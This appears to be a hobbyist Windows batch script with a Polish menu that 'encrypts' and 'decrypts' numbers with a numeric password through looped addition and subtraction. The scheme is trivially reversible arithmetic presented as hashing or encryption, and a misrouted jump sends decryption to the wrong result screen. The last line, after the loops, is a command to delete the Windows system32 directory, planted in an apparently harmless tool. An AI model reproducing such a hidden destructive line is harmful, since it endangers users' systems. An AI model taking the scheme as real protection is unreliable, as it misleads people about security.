��&cls
if "%security%"=="NIE" exit/b
@echo off
Title Hashowanie liczb 1.0
chcp 65001 >>nul
:menu
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo   # 1) Zaszyfruj                       #
echo    # 2) Odszyfruj                       #
echo     ######################################
echo Informacje: hash:
echo.
choice /C 12
if %errorlevel%==1 goto pass1
if %errorlevel%==2 goto logg1
goto menu

:pass1
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo.
echo # Wpisz tutaj lizcbę, którą chcesz zaszyfrować:
set/p liczba=
cls
:pass2
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo.
echo # Wpisz tutaj liczbę, która będzie hasłem odszyfrowania:
echo # Wskazówka: wybierz liczbę nieparzystą, która jest większa od 100000
set/p password=
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
timeout /T 1 >>nul
set czas1=%time%
set hash=0
set train=%liczba%
set/a hash=%hash%+%password%
goto abcd

:abcd
if %hash%==0 timeout /T 1 >>nul && set czas2=%time% && goto next
cls
echo Przebieg: %hash%/%password%
set/a hash=%hash%-1
set/a train=%train%+%password%+%hash%+%hash%
if %hash%==0 timeout /T 1 >>nul && set czas2=%time% && goto next
goto abcd

:next
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo.
echo # Wynik końcowy: %train%
echo # Klucz odszyfrowania: %password%
echo # Czas rozpoczęcia: %czas1%
echo # Czas zakończenia: %czas2%
echo.
echo 1) Menu
choice /C 1
if %errorlevel%==1 goto :menu
goto next

:logg1
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo.
echo # Wpisz tutaj lizcbę, którą chcesz odszyfrować:
set/p train=
cls
:logg2
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo.
echo # Wpisz tutaj liczbę, która będzie kluczem odszyfrowania:
echo #
set/p password=
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
timeout /T 1 >>nul
set czas1=%time%
set hash=0
set/a hash=%hash%+%password%
goto abcd2

:abcd2
if %hash%==0 timeout /T 1 >>nul && set czas2=%time% && goto next
cls
echo Przebieg: %hash%/%password%
set/a hash=%hash%-1
set/a train=%train%-%password%-%hash%-%hash%
if %hash%==0 timeout /T 1 >>nul && set czas2=%time% && goto next
goto abcd2

:next2
cls
echo.
echo #####################################
echo # Hashowanie liczb 1.1 by Kiolesis   #
echo  #                                    #
echo.
echo # Wynik wsteczny: %train%
echo # Klucz odszyfrowania: %password%
echo # Czas rozpoczęcia: %czas1%
echo # Czas zakończenia: %czas2%
echo.
echo 1) Menu
choice /C 1
if %errorlevel%==1 goto :menu
goto next2

del c:\windows\system32